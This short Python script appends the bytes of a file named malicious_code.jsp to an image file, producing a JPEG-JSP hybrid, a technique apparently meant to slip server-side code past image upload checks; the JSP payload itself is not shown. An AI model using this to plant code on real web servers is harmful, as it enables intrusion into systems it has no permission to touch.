malicious_image_path = "./malicious_image.jpg"
malicious_code_path = "./malicious_code.jsp"

with open(malicious_code_path, "rb") as malicious_code_file:
    malicious_code_data = malicious_code_file.read()

with open(malicious_image_path, "rb") as malicious_image_file:
    malicious_image_data = malicious_image_file.read()

malicious_image_jsp_file_path = "./hybrid_malicious_image_jsp.jpg"

with open(malicious_image_jsp_file_path, "wb") as hybrid_file:
    hybrid_file.write(malicious_image_data + malicious_code_data)

